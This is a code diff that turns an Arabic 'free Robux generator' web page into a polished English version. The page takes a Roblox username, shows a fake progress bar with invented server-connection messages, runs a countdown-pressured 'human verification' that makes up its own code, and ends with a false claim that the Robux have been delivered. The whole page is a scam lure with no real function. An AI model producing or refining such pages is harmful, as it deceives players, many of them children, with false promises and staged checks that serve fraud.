@@ -1,38 +1,65 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>روبوكس مولد روبوكس مجاني</title>
-    <meta name="description" content="احصل على روبوكس مجاني الآن! مولد روبوكس يعمل على جميع الأجهزة">
+    <title>Free Robux Generator | Get 10,000+ Robux Instantly</title>
+    <meta name="description" content="Claim your free Robux today! Our generator works on all platforms including PC, Mobile, and Xbox.">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
+        /* Modern CSS with animations and responsive design */
+        :root {
+            --primary: #8e44ad;
+            --secondary: #9b59b6;
+            --dark: #1a1a2e;
+            --light: #f5f5f5;
+            --success: #27ae60;
+        }
         
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Tajawal', sans-serif;
+            font-family: 'Poppins', sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #1a1a2e, #16213e);
-            color: #fff;
+            background: linear-gradient(135deg, var(--dark), #16213e);
+            color: white;
             min-height: 100vh;
             overflow-x: hidden;
         }
         
-        .header {
-            background: linear-gradient(to right, #8e2de2, #4a00e0);
-            padding: 1.5rem 0;
+        .hero {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            padding: 2rem 0;
             text-align: center;
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hero::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            animation: pulse 8s infinite linear;
+        }
+        
+        @keyframes pulse {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         
         .logo {
-            max-width: 200px;
+            max-width: 220px;
             height: auto;
             filter: drop-shadow(0 2px 5px rgba(0, 0, 0, 0.5));
+            position: relative;
+            z-index: 2;
         }
         
         .container {
@@ -49,13 +76,19 @@
             border: 1px solid rgba(255, 255, 255, 0.2);
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
             margin-bottom: 30px;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
         }
         
         .title {
             text-align: center;
             margin-bottom: 25px;
             font-size: 28px;
-            color: #fff;
+            color: white;
             text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
         }
         
@@ -64,6 +97,7 @@
             font-size: 16px;
             color: #a5b1c2;
             margin-top: 10px;
+            font-weight: 400;
         }
         
         .input-group {
@@ -83,7 +117,7 @@
             border-radius: 10px;
             border: none;
             background: rgba(255, 255, 255, 0.1);
-            color: #fff;
+            color: white;
             font-size: 16px;
             transition: all 0.3s;
             border: 1px solid rgba(255, 255, 255, 0.1);
@@ -92,7 +126,8 @@
         .input-field:focus {
             outline: none;
             background: rgba(255, 255, 255, 0.2);
-            border-color: #8e44ad;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(142, 68, 173, 0.3);
         }
         
         .platforms {
@@ -121,8 +156,8 @@
         }
         
         .platform.active {
-            background: #8e44ad;
-            border-color: #9b59b6;
+            background: var(--primary);
+            border-color: var(--secondary);
             transform: translateY(-5px);
             box-shadow: 0 5px 15px rgba(142, 68, 173, 0.4);
         }
@@ -130,18 +165,20 @@
         .btn {
             display: block;
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             border-radius: 10px;
-            background: linear-gradient(to right, #8e44ad, #9b59b6);
+            background: linear-gradient(to right, var(--primary), var(--secondary));
             color: white;
             font-size: 18px;
-            font-weight: bold;
+            font-weight: 600;
             border: none;
             cursor: pointer;
             transition: all 0.3s;
             text-align: center;
             text-decoration: none;
             box-shadow: 0 5px 15px rgba(142, 68, 173, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
         
         .btn:hover {
@@ -151,6 +188,15 @@
         
         .btn:active {
             transform: translateY(0);
+        }
+        
+        .btn-secondary {
+            background: rgba(255,255,255,0.1);
+            box-shadow: none;
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(255,255,255,0.2);
         }
         
         .robux-options {
@@ -171,7 +217,7 @@
         }
         
         .robux-option.active {
-            background: #27ae60;
+            background: var(--success);
             border-color: #2ecc71;
             transform: scale(1.05);
             box-shadow: 0 5px 15px rgba(39, 174, 96, 0.4);
@@ -196,7 +242,7 @@
         .loading-icon {
             font-size: 50px;
             margin-bottom: 20px;
-            color: #8e44ad;
+            color: var(--primary);
             animation: spin 1s linear infinite;
         }
         
@@ -216,6 +262,37 @@
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .progress-bar {
+            height: 6px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .verification-box {
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .countdown {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--primary);
+            margin: 10px 0;
         }
         
         footer {
@@ -238,27 +315,32 @@
             .platform i {
                 font-size: 20px;
             }
+            
+            .card {
+                padding: 20px;
+            }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <header class="header">
+    <header class="hero">
         <img src="https://i.imgur.com/JqYeYnN.png" alt="Robux Generator" class="logo">
     </header>
     
     <div class="container">
-        <!-- الخطوة 1: إدخال اسم المستخدم -->
+        <!-- Step 1: Username Input -->
         <div class="card step" id="step1">
-            <h1 class="title">روبوكس مولد<span>احصل على روبوكس مجاني الآن!</span></h1>
+            <h1 class="title">Free Robux Generator<span>Get unlimited Robux for your Roblox account</span></h1>
             
             <div class="input-group">
-                <label class="input-label">اسم مستخدم روبلوكس:</label>
-                <input type="text" class="input-field" id="username" placeholder="أدخل اسم المستخدم الخاص بك">
+                <label class="input-label">Roblox Username:</label>
+                <input type="text" class="input-field" id="username" placeholder="Enter your Roblox username">
             </div>
             
             <div class="input-group">
-                <label class="input-label">اختر منصتك:</label>
+                <label class="input-label">Select Your Platform:</label>
                 <div class="platforms">
                     <div class="platform" data-platform="windows">
                         <i class="fab fa-windows"></i>
@@ -279,72 +361,126 @@
                 </div>
             </div>
             
-            <button class="btn" id="continueBtn">متابعة</button>
+            <button class="btn" id="continueBtn">Continue</button>
         </div>
         
-        <!-- الخطوة 2: اختيار كمية الروبوكس -->
+        <!-- Step 2: Robux Amount Selection -->
         <div class="card step hidden" id="step2">
-            <h1 class="title">اختر الكمية<span>حدد عدد الروبوكس التي تريدها</span></h1>
+            <h1 class="title">Select Amount<span>Choose how much Robux you want</span></h1>
             
             <div class="robux-options">
                 <div class="robux-option" data-amount="1000">
                     <div class="robux-amount">1,000</div>
-                    <div class="robux-label">روبوكس</div>
+                    <div class="robux-label">Robux</div>
                 </div>
                 <div class="robux-option" data-amount="5000">
                     <div class="robux-amount">5,000</div>
-                    <div class="robux-label">روبوكس</div>
+                    <div class="robux-label">Robux</div>
                 </div>
                 <div class="robux-option" data-amount="10000">
                     <div class="robux-amount">10,000</div>
-                    <div class="robux-label">روبوكس</div>
+                    <div class="robux-label">Robux</div>
                 </div>
                 <div class="robux-option" data-amount="50000">
                     <div class="robux-amount">50,000</div>
-                    <div class="robux-label">روبوكس</div>
+                    <div class="robux-label">Robux</div>
                 </div>
             </div>
             
-            <button class="btn" id="selectBtn">تأكيد الاختيار</button>
+            <button class="btn" id="selectBtn">Confirm Selection</button>
         </div>
         
-        <!-- الخطوة 3: التحميل -->
+        <!-- Step 3: Loading -->
         <div class="card step hidden" id="step3">
             <div class="loading">
                 <i class="fas fa-cog loading-icon"></i>
-                <h2 class="title">جاري التحضير<span>نقوم بتحضير الروبوكس الخاصة بك</span></h2>
-                <p>الرجاء الانتظار بينما نقوم بمعالجة طلبك...</p>
+                <h2 class="title">Processing Your Request<span>Preparing your Robux package</span></h2>
+                
+                <div class="progress-bar">
+                    <div class="progress" id="progressBar"></div>
+                </div>
+                
+                <p id="statusText">Connecting to Roblox servers...</p>
             </div>
         </div>
         
-        <!-- الخطوة 4: إكمال التحقق -->
+        <!-- Step 4: Human Verification -->
         <div class="card step hidden" id="step4">
-            <h1 class="title">إكمال التحقق<span>لضمان أنك لست روبوت</span></h1>
+            <h1 class="title">Human Verification<span>Complete to receive your Robux</span></h1>
             
             <p style="margin-bottom: 20px; text-align: center;">
-                مرحبًا <span id="displayUsername" style="color: #8e44ad; font-weight: bold;"></span>! 
-                <span id="displayAmount" style="color: #8e44ad; font-weight: bold;"></span> روبوكس جاهزة لك.
-                يرجى إكمال التحقق البشري أدناه.
+                Hello <span id="displayUsername" style="color: var(--primary); font-weight: bold;"></span>! 
+                Your <span id="displayAmount" style="color: var(--primary); font-weight: bold;"></span> Robux are ready.
+                Please complete human verification below to prevent abuse.
             </p>
             
-            <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 10px; margin-bottom: 20px;">
-                <p style="text-align: center; margin-bottom: 15px;">انقر على الزر أدناه لبدء التحقق:</p>
-                <button class="btn" id="verifyBtn">بدء التحقق</button>
+            <div class="verification-box">
+                <p style="margin-bottom: 15px;">Time remaining to complete verification:</p>
+                <div class="countdown" id="countdown">01:30</div>
+                <button class="btn" id="verifyBtn">Start Verification</button>
             </div>
             
-            <p style="font-size: 12px; text-align: center; color: rgba(255,255,255,0.6);">
-                هذا التحقق مطلوب لمنع الاستخدام الآلي للنظام.
+            <div class="input-group" style="margin-top: 20px;">
+                <label class="input-label">Enter verification code:</label>
+                <input type="text" class="input-field" id="verificationCode" placeholder="Code will appear after verification">
+            </div>
+            
+            <button class="btn btn-secondary" id="submitCodeBtn" disabled>Submit Code</button>
+            
+            <p style="font-size: 12px; text-align: center; color: rgba(255,255,255,0.6); margin-top: 20px;">
+                This verification is required to prevent automated requests and ensure fair distribution.
             </p>
+        </div>
+        
+        <!-- Step 5: Success -->
+        <div class="card step hidden" id="step5">
+            <div class="loading">
+                <i class="fas fa-check-circle" style="font-size: 50px; color: var(--success); margin-bottom: 20px;"></i>
+                <h2 class="title">Success!<span>Your Robux are being delivered</span></h2>
+                
+                <p style="text-align: center; margin: 20px 0;">
+                    <span id="successUsername" style="color: var(--primary); font-weight: bold;"></span>, your 
+                    <span id="successAmount" style="color: var(--primary); font-weight: bold;"></span> Robux 
+                    are being added to your account. This may take 3-5 minutes.
+                </p>
+                
+                <div class="progress-bar">
+                    <div class="progress" style="width: 100%;"></div>
+                </div>
+                
+                <p id="successText" style="text-align: center; margin-top: 20px;">
+                    Please keep this window open until completion...
+                </p>
+            </div>
         </div>
     </div>
     
     <footer>
-        <p>هذا الموقع غير مرتبط بـ Roblox Corporation. جميع الحقوق محفوظة.</p>
+        <p>This website is not affiliated with Roblox Corporation. All rights reserved to their respective owners.</p>
     </footer>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // اختيار المنصة
+            // DOM Elements
+            const steps = {
+                step1: document.getElementById('step1'),
+                step2: document.getElementById('step2'),
+                step3: document.getElementById('step3'),
+                step4: document.getElementById('step4'),
+                step5: document.getElementById('step5')
+            };
+            
+            const usernameInput = document.getElementById('username');
+            const continueBtn = document.getElementById('continueBtn');
+            const selectBtn = document.getElementById('selectBtn');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const submitCodeBtn = document.getElementById('submitCodeBtn');
+            const verificationCodeInput = document.getElementById('verificationCode');
+            const progressBar = document.getElementById('progressBar');
+            const statusText = document.getElementById('statusText');
+            const countdown = document.getElementById('countdown');
+            
+            // Platform selection
             const platforms = document.querySelectorAll('.platform');
             platforms.forEach(platform => {
                 platform.addEventListener('click', function() {
@@ -353,7 +489,7 @@
                 });
             });
             
-            // اختيار كمية الروبوكس
+            // Robux amount selection
             const robuxOptions = document.querySelectorAll('.robux-option');
             robuxOptions.forEach(option => {
                 option.addEventListener('click', function() {
@@ -362,56 +498,130 @@
                 });
             });
             
-            // متابعة إلى الخطوة 2
-            document.getElementById('continueBtn').addEventListener('click', function() {
-                const username = document.getElementById('username').value;
+            // Continue to Step 2
+            continueBtn.addEventListener('click', function() {
+                const username = usernameInput.value.trim();
                 const selectedPlatform = document.querySelector('.platform.active');
                 
                 if (!username || username.length < 3) {
-                    alert('الرجاء إدخال اسم مستخدم صحيح');
+                    alert('Please enter a valid Roblox username (at least 3 characters)');
                     return;
                 }
                 
                 if (!selectedPlatform) {
-                    alert('الرجاء اختيار المنصة الخاصة بك');
+                    alert('Please select your platform');
                     return;
                 }
                 
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
+                // Hide current step and show next
+                steps.step1.classList.add('hidden');
+                steps.step2.classList.remove('hidden');
             });
             
-            // تأكيد الاختيار والانتقال إلى الخطوة 3
-            document.getElementById('selectBtn').addEventListener('click', function() {
+            // Confirm selection and go to Step 3
+            selectBtn.addEventListener('click', function() {
                 const selectedAmount = document.querySelector('.robux-option.active');
                 
                 if (!selectedAmount) {
-                    alert('الرجاء اختيار كمية الروبوكس');
+                    alert('Please select a Robux amount');
                     return;
                 }
                 
-                document.getElementById('step2').classList.add('hidden');
-                document.getElementById('step3').classList.remove('hidden');
+                // Hide current step and show loading
+                steps.step2.classList.add('hidden');
+                steps.step3.classList.remove('hidden');
                 
-                // عرض اسم المستخدم والكمية في الخطوة 4
-                const username = document.getElementById('username').value;
-                const amount = selectedAmount.getAttribute('data-amount');
-                
-                document.getElementById('displayUsername').textContent = username;
-                document.getElementById('displayAmount').textContent = amount;
-                
-                // الانتقال إلى الخطوة 4 بعد 3 ثواني (محاكاة للتحميل)
-                setTimeout(() => {
-                    document.getElementById('step3').classList.add('hidden');
-                    document.getElementById('step4').classList.remove('hidden');
-                }, 3000);
+                // Simulate loading progress
+                let progress = 0;
+                const loadingInterval = setInterval(() => {
+                    progress += Math.random() * 10;
+                    if (progress > 100) progress = 100;
+                    progressBar.style.width = `${progress}%`;
+                    
+                    // Update status text
+                    if (progress < 30) {
+                        statusText.textContent = "Connecting to Roblox servers...";
+                    } else if (progress < 60) {
+                        statusText.textContent = "Verifying account information...";
+                    } else if (progress < 90) {
+                        statusText.textContent = "Preparing Robux transfer...";
+                    } else {
+                        statusText.textContent = "Almost done! Finalizing...";
+                    }
+                    
+                    // When complete
+                    if (progress === 100) {
+                        clearInterval(loadingInterval);
+                        setTimeout(() => {
+                            // Set user data for next steps
+                            const username = usernameInput.value.trim();
+                            const amount = selectedAmount.getAttribute('data-amount');
+                            
+                            document.getElementById('displayUsername').textContent = username;
+                            document.getElementById('displayAmount').textContent = amount;
+                            document.getElementById('successUsername').textContent = username;
+                            document.getElementById('successAmount').textContent = amount;
+                            
+                            // Go to verification step
+                            steps.step3.classList.add('hidden');
+                            steps.step4.classList.remove('hidden');
+                            
+                            // Start countdown timer
+                            startCountdown();
+                        }, 1000);
+                    }
+                }, 300);
             });
             
-            // بدء التحقق
-            document.getElementById('verifyBtn').addEventListener('click', function() {
-                alert('سيتم توجيهك إلى صفحة التحقق الآن...');
-                // هنا يمكنك إضافة الرمز لإعادة التوجيه إلى صفحة التحقق الفعلية
+            // Start verification process
+            verifyBtn.addEventListener('click', function() {
+                // Generate random verification code
+                const code = Math.random().toString(36).substring(2, 8).toUpperCase();
+                verificationCodeInput.placeholder = `Your code: ${code}`;
+                verificationCodeInput.value = code;
+                submitCodeBtn.disabled = false;
+                verifyBtn.disabled = true;
+                verifyBtn.textContent = "Verification Started";
+                verifyBtn.classList.add('btn-secondary');
             });
+            
+            // Submit verification code
+            submitCodeBtn.addEventListener('click', function() {
+                if (!verificationCodeInput.value) {
+                    alert('Please enter the verification code');
+                    return;
+                }
+                
+                // Go to success step
+                steps.step4.classList.add('hidden');
+                steps.step5.classList.remove('hidden');
+                
+                // Simulate final processing
+                setTimeout(() => {
+                    document.getElementById('successText').textContent = "Transfer complete! Your Robux should now be in your account.";
+                }, 5000);
+            });
+            
+            // Countdown timer function
+            function startCountdown() {
+                let timeLeft = 90; // 1 minute 30 seconds
+                
+                const countdownInterval = setInterval(() => {
+                    const minutes = Math.floor(timeLeft / 60);
+                    const seconds = timeLeft % 60;
+                    
+                    countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                    
+                    if (timeLeft <= 0) {
+                        clearInterval(countdownInterval);
+                        countdown.textContent = "Time's up!";
+                        countdown.style.color = "#e74c3c";
+                        verifyBtn.disabled = true;
+                    } else {
+                        timeLeft--;
+                    }
+                }, 1000);
+            }
         });
     </script>
 </body>
